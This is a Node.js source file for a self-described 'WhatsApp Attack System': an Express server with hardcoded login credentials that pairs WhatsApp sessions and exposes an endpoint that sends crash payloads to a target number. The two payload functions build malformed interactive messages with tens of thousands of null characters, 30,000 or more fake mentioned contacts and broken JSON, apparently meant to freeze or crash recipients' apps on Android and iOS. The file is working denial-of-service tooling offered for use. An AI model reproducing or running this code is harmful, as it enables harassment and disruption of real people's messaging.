// app.js - Complete WhatsApp Attack System
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const jwt = require('jsonwebtoken');
const { makeWASocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
const { Boom } = require('@hapi/boom');

// Configuration
const config = {
  PORT: process.env.PORT || 1000,
  JWT_SECRET: process.env.JWT_SECRET || 'Usama@960Cr4sh!S3cr3tK3y#2024@Wh4tsApp',
  USERNAME: 'usama',
  PASSWORD: '@usama960',
  SESSION_TIMEOUT: 3600000 // 1 hour
};

// App setup
const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(express.static('public'));

// Global state
const activeSessions = new Map();

// WhatsApp attack functions
async function usamanew(target, sock) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { text: '"U̴̦͖͂͛ S̵̪̞̽ A̵̛̳͘ M̶̢̰͌̓ A̴͉̖̚"' },
          footer: { text: '"Ư̵̡̖̳̘̪̱̚͜ ̷̳͕͖̈́͐̐S̵̢̹̗͕̜̩̼̋̈́̎̍̈́̇͑"' },
          carouselMessage: {
            cards: [{
              header: {
                title: '\u0000'.repeat(9999),
                imageMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc",
                  mimetype: "image/jpeg",
                  fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                  fileLength: "999999999",
                  height: 1,
                  width: 1,
                  mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                  fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                  directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc",
                  mediaKeyTimestamp: "1749172037",
                  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD...",
                  scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                  scanLengths: [8596, 155493]
                },
                hasMediaAttachment: true,
              },
              body: { text: "\u0000".repeat(9999) },
              footer: { text: "© U S A M A" },
              nativeFlowMessage: {
                messageParamsJson: "\n".repeat(9999)
              }
            }]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            mentionedJid: [
              "13135550002@s.whatsapp.net", 
              target,
              ...Array.from({ length: 35000 }, () =>
                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
              )
            ],
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: { text: "Sent", format: "DEFAULT" },
                    nativeFlowResponseMessage: {
                      name: "call_permission_request",
                      paramsJson: JSON.stringify(" status: true "),
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });

  return { success: true, target };
}

async function usamanew2(target, sock) {
  const message = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "\u0000".repeat(9000),
            hasMediaAttachment: false,
            locationMessage: {
              degreesLatitude: -6666666666,
              degreesLongitude: 6666666666,
              name: "\u0000".repeat(10000),
              address: "\u0000".repeat(10000)
            }
          },
          body: { text: "UsamaCrash" },
          footer: { text: "\u0000".repeat(3000) },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000)
          },
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 30000 }, () =>
                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
              )
            ],
            externalAdReply: {
              title: "\u2063".repeat(200),
              body: "\u2063".repeat(200),
              mediaType: 1,
              showAdAttribution: true,
              thumbnailUrl: "https://files.catbox.moe/xl4fuz.png",
              sourceUrl: "/u0000".repeat(1000)
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(target, message, {
    messageId: null,
    participant: { jid: target },
    userJid: target
  });

  return { success: true, target };
}

// Routes
app.post('/api/auth/login', (req, res) => {
  const { username, password } = req.body;
  
  if (username === config.USERNAME && password === config.PASSWORD) {
    const token = jwt.sign({ username }, config.JWT_SECRET, { expiresIn: '1h' });
    return res.json({ success: true, token });
  }
  
  res.status(401).json({ success: false, message: 'Invalid credentials' });
});

function verifyToken(req, res, next) {
  const token = req.headers['authorization'];
  if (!token) return res.status(403).send('Access denied');

  try {
    const verified = jwt.verify(token, config.JWT_SECRET);
    req.user = verified;
    next();
  } catch (err) {
    res.status(400).send('Invalid token');
  }
}

app.post('/api/whatsapp/pair', verifyToken, async (req, res) => {
  const { number } = req.body;
  if (!number) return res.status(400).json({ error: 'Number is required' });

  const code = Math.floor(10000000 + Math.random() * 90000000).toString();
  
  try {
    const { state, saveCreds } = await useMultiFileAuthState(`./sessions/${code}`);
    const sock = makeWASocket({
      auth: state,
      printQRInTerminal: true,
    });

    sock.ev.on('connection.update', (update) => {
      const { connection, qr } = update;
      
      if (connection === 'close') {
        activeSessions.delete(code);
      } else if (connection === 'open') {
        const session = activeSessions.get(code);
        if (session) {
          session.status = 'connected';
          session.sock = sock;
        }
      }
    });

    sock.ev.on('creds.update', saveCreds);

    activeSessions.set(code, {
      number,
      createdAt: Date.now(),
      status: 'pending',
      sock
    });

    res.json({ 
      code,
      link: `https://wa.me/${number}?text=${encodeURIComponent(`Your pairing code: ${code}`)}`
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.get('/api/whatsapp/status/:code', verifyToken, (req, res) => {
  const { code } = req.params;
  const session = activeSessions.get(code);
  
  if (!session) {
    return res.status(404).json({ error: 'Invalid code' });
  }

  res.json({ 
    status: session.status,
    number: session.number
  });
});

app.post('/api/attack/execute', verifyToken, async (req, res) => {
  const { code, target, attackType } = req.body;
  
  const session = activeSessions.get(code);
  if (!session || session.status !== 'connected') {
    return res.status(400).json({ error: 'Invalid or not connected session' });
  }

  try {
    let result;
    if (attackType === 'fuckinvi') {
      result = await usamanew(target, session.sock);
    } else if (attackType === 'fuckios') {
      result = await usamanew2(target, session.sock);
    } else {
      return res.status(400).json({ error: 'Invalid attack type' });
    }

    res.json({ success: true, result });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Frontend HTML
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/public/index.html');
});

// Start server
app.listen(config.PORT, () => {
  console.log(`Server running on port ${config.PORT}`);
});